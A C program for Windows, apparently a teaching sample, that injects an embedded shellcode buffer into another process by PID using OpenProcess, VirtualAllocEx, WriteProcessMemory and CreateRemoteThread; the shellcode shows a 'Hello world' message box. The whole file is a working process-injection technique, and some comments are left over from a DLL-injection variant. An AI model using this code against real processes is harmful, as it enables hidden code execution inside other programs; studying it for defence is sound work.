#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[])
{
	unsigned char maliciousCode[] =
		"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00\x48\x8D\x0D\x52\x00"
		"\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48"
		"\x8D\x15\x5F\x00\x00\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00\x48\x33\xC9\xFF\xD0"
		"\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48"
		"\x33\xC9\xFF\xD0\x4B\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33\x32\x2E\x44\x4C\x4C"
		"\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77"
		"\x6F\x72\x6C\x64\x00\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x54\x68\x72"
		"\x65\x61\x64\x00\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60\x00\x00\x00\x4D\x8B"
		"\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84"
		"\xC0\x74\x26\x8A\x27\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33\xC0\xE9\xA7\x00\x00"
		"\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45"
		"\x8B\x29\x4D\x85\xED\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C\x03\xD3\xFF\xC9\x4D"
		"\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74"
		"\x09\xEB\xF5\xE2\xE6\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B\xC5\x7C\x2F\x49\x3B"
		"\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75"
		"\xFA\xA4\xC7\x07\x44\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

	unsigned int victimProcessId;

	if (argc > 1)
	{
		/*
		The function atoi() isn't the best solution for converting a char pointer to integer,
		as it will convert any invalid number to 0.
		A better solution is described here: https://stackoverflow.com/questions/2797813/how-to-convert-a-command-line-argument-to-int
		*/
		victimProcessId = atoi(argv[1]);
		printf("[+] Performing Process Injection using CreateRemoteThread inside the victim process identified by the PID: %d\n", victimProcessId);
	}
	else
	{
		printf("[+] Usage:\n\tprogram.exe PID\n");
		return 1;
	}

	DWORD desiredAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
	HANDLE handleVictimProcess = OpenProcess(
		desiredAccess,								// PROCESS_VM_OPERATION is enough for a successful call to VirtualAllocEx
													// however WriteProcessMemory also requires PROCESS_VM_WRITE according to the docs
													// CreateRemoteThread also requires PROCESS_VM_READ, PROCESS_CREATE_THREAD, 
													// and PROCESS_QUERY_INFORMATION
		NULL,										// whether the processes created by this process can inherit this handle
													// in this case it's NULL, so no inheritance
		victimProcessId);							// open this specific process

	/*
	According to the official documentation, OpenProcess returns NULL if it fails to get a handle
	Ref: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	*/
	if (handleVictimProcess == NULL)
	{
		printf("[!] Call to OpenProcess failed\n");

		/*
		According to the official documentation, you can use the function GetLastError() to get
		extended error information
		Ref: https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror
		*/
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}
	else
	{
		printf("[+] Successfully created a handle for the victim process\n");
	}

	/*
	Allocate some space inside the memory of the victim process.
	Later, it will store the shellcode for the MessageBox.
	For more information regarding the arguments of VirtualAllocEx:
	https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
	*/
	LPVOID allocatedMemory = VirtualAllocEx(
		handleVictimProcess,					// reserve a new memory page inside the victim process
		NULL,									// we don't care where to allocate the memory
		4096,									// allocate 4096 bytes
		MEM_COMMIT | MEM_RESERVE,				// commit and reserve memory in one step
		PAGE_EXECUTE_READWRITE);						// set the memory page as readable/writable

	if (allocatedMemory == NULL)
	{
		printf("[!] Call to VirtualAllocEx failed\n");
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}
	else
	{
		printf("[+] Successfully allocated some memory in the victim process\n");
		printf("[+] Starting address: %p\n", allocatedMemory);
	}

	/*
	Once we have allocate a memory page in the victim process, we can write our shellcode there.
	*/
	BOOL retVal = WriteProcessMemory(
		handleVictimProcess,			// handle to the process in which to the write the bytes
		allocatedMemory,				// starting address where to write the bytes
		maliciousCode,					// buffer containing the bytes to write
		sizeof(maliciousCode),			// number of bytes to write, in this case: the size of the path
		NULL);							// pointer to variable which will contain the number of bytes written
										// in this case, we don't really need it

	if (retVal == 0)
	{
		printf("[!] Call to WriteProcessMemory failed\n");
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}
	else
	{
		printf("[+] Successfully wrote the malicious code in the memory page\n");
	}

	/*
	We're ready to create a new thread in the victim process, in order to
	execute the malicious code and perform the Process Injection
	*/
	HANDLE remoteThread = CreateRemoteThread(
		handleVictimProcess,								// handle to the victim process
		NULL,												// pointer to SECURITY_ATTRIBUTES struct
															// can be null if we want default security attributes
		0,													// size of the stack, 0 for default
		(LPTHREAD_START_ROUTINE)allocatedMemory,			// starting address of the thread
															// in this case, the address of LoadLibraryA
		NULL,												// pointer to a variable to be passed to the thread function
		0,													// flags to manipulate the creation of the thread
															// (e.g. start suspended)
															// in this case, 0 -> start thread immediately
		NULL);												// pointer to a variable that receives the thread identifier
															// we don't need it, so it's set to NULL

	if (remoteThread == NULL)
	{
		printf("[!] Couldn't create the remote thread. Error: %d\n", GetLastError());
		return 1;
	}
	else
	{
		printf("[+] Remote thread create. The DLL should be loaded right now...");
	}

	/*
	You can use WaitForSingleObject in order to wait for the remote thread to finish,
	before terminating the current program.
	*/
	WaitForSingleObject(remoteThread, INFINITE);

	return 0;
}
